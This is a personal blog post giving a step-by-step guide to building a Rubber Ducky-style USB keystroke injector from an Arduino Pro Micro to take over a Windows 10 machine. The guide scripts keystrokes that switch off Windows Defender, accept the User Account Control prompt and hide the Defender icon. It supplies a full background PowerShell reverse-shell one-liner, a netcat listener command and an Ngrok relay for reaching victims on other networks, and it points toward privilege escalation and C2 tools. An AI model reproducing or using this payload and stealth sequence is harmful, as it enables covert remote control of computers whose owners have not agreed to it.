---
title: "revducky"
date: 2022-12-14T11:45:01+08:00
---

[Home](/)

<h1 style="line-height: 1.0;">I made a rubber ducky reverse shell for <$10 (Win-10)</h1>
<br/>

<center><img src="/hak5ducky.jpg" alt="hak5 rubber ducky" width="57%" height="57%"><br/>USB Rubber Ducky by Hak5</center>

The Hak5 USB Rubber Ducky is a small microcontroller that acts as a keyboard and automatically enters pre-programmed keystrokes. The original Rubber Ducky by Hak5 will cost you 60$. I will be making one for under 10$ with an Arduino pro micro and writing a script to start and conceal a Windows 10 reverse shell. This blog post will be a guide for users with a Linux attacker machine and a Windows 10 Home victim machine. Please contact me on discord at SuperTsumu#9404 if there are any enquires.

## [Click here to watch it in action](https://www.youtube.com/watch?v=XgKbkeE1UFg)
<br/>
## Software and Hardware Requirements

<center><img src="/promicro.jpg" alt="hak5 rubber ducky" width="57%" height="57%"><br/>My Pro micro and USB connector</center>

<ul>
<li>1 Arduino Pro Micro</li>
<li>1 Male Micro USB to Male USB A</li>
<li>A Web Browser</li>
<li>A Victim Windows 10 Home Edition machine and an Attacker machine</li>
<li>Arduino IDE</li>
<li>Netcat</li>
<li>Ngrok (Optional)</li>
</ul>

<br/>

## The Concept

Rubber Ducky commands are written in Ducky Script, a very simple Basic-like scripting language. Ducky Script is used to specify what keystrokes are to be inputted by the Rubber Ducky. We will be scripting with Ducky Script and converting it into C with [Duckuino](https://dukweeno.github.io/Duckuino/) which we will then compile and flash into our pro micro. I chose to use the pro micro because it has support for HID inputs and because I am familiar with programming and flashing Arduinos.

For a Windows reverse shell to work, we will have to disable Windows Defender. I don’t think there is a way to do it on the command line so I improvised and decided to program the navigation to the Windows Defender GUI and disable the antivirus manually with only keystrokes (More on that later). I also put in a lot of effort into concealing anything suspicious such as removing the Windows Defender applet with the red cross on the task bar and backgrounding the powershell reverse shell so that the process runs outside of the desktop.

## Scripting

#Disclaimer: My script is written and tested Windows 10 Home edition. Navigation towards certain areas may be different on your victim machine. If the script fails to navigate to the certain parts, please trace your steps and script accordingly.

[Click here for the Ducky Script documentation](https://app.gitbook.com/o/-MhLMNy_PPNtiWwEW3m9/s/-MjACIlYXNWPVgeWjK9f/the-ducky-script-language/ducky-script-quick-reference). It is very simple and anyone can pick it up in less than 5 minutes. My Ducky Scripts can be found over [here](https://github.com/supertsumu/duckyscripts) on my Github.

First, we have to disable Windows Defender for anything to work. The goal is to navigate to the Windows Defender Antivirus GUI with only keystrokes. What I like to navigate to that page manually only with keystrokes and tracing what I enter at the same time. We can use Win+R to open the Windows Defender GUI and navigate pages using “tabs” and “enter”. Once I got to the “Virus & threat protection settings”, I tab to focus on the “Real-time protection” switch and turn it off using “space”. This will bring up the “User account control” prompt that asks for permissions before disabling the antivirus. We can bypass this by using “LEFTARROW” and hitting “enter” to accept the permissions. We then close the Windows Defender GUI using alt+f4.

<center><img src="/windef.jpg" alt="hak5 rubber ducky" width="80%" height="80%"><br/>Virus & threat protection > Manage settings</center>

#NOTE: It is vital to use the “DELAY” function between keystrokes. Add more delay when launching GUI apps as they might take some time to load. It is safer to be liberal with the amount of delay because the commands may be out of sync if they execute before the application has loaded.

We use the same navigation method to disable the antivirus and remove the Windows Defender icon from the taskbar.

Use this modified powershell reverse shell one-liner that runs the process in the background:

```
Start-Job -ScriptBlock{$client = New-Object System.Net.Sockets.TCPClient("[IP Address]",[Port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
```
Replace [IP Address] and [Port] with the IP address and port number of your listening machine.

After completing the Ducky Script, we copy and paste the script into [Duckuino](https://dukweeno.github.io/Duckuino/) and copy and paste the C output into the Arduino IDE, save the sketch and flash the commands into the pro micro.

<center><img src="/arduinoide.jpg" alt="hak5 rubber ducky" width="100%" height="100%"><br/>Paste the output from Duckuino into the IDE, save the file and flash the binary into your pro micro while it is plugged into your computer</center>

## Listening for reverse shells with netcat and Ngrok

If our target machine is on the same network as the attacker machine, we can simply start a basic netcat listener to listen for connections:

```bash
nc -lnvp [port] -s [ip address]
```
You can locate your private IP address using “ifconfig” on linux:

<center><img src="/ifconfig.png" width="100%" height="100%"><br/></center>

Say we want to start a reverse shell on another machine that is on another network, we can not use our private IP address. We have to use our public IP address which is the IP address of our router. Instead of dealing with port forwarding, we can use Ngrok. Ngrok hosts a server with a public IP address and forwards any requests onto your machine. This means machines outside your network will be able to communicate with your machine through Ngrok as a middleman. Sign up for Ngrok [here](https://ngrok.com/) and follow the steps to integrate ngrok onto your attacker machine.

We can start a public Ngrok tcp server using:

```bash
ngrok tcp [port you want Ngrok to forward to]
```

This will start a process on your terminal:

<center><img src="/ngrok.png" width="100%" height="100%"><br/></center>

Since we are using Ngrok as a middle man between our victim machine and our attacker machine, we have to use Ngrok’s public IP/DNS in our payload. Replace the [IP Address] and [Port] part of the powershell one-liner from the payload with Ngrok’s DNS. In my case, the IP address will be 2.tcp.ngrok.io and the port will be 14485. Disregard the tcp:// protocol handler for the payload to work. Then start the same netcat listener mentioned before.

We are done! Now all theres left is to test it by simply plugging it into your Windows 10 machine. You may find that your script may sometimes be out of sync during certain parts of the script. Be sure to add more delay during those parts

## Whats next?

First thing you might want to look into is shell hardening. The netcat reverse shell lacks a lot of features. For example, the shell will not be able to accept arrow inputs, ctrl+c kills the shell and most importantly, we can’t run CLI tools that use the command line as an interactive interface.

After getting a more feature-rich shell, you can try to escalate your privileges or have fun with some post exploitation, its up to you really!

You might also want to consider a more feature-rich C2 framework such as Metasploit's meterpreter or Sliver.

This is the end of my first blog. Thanks for reading.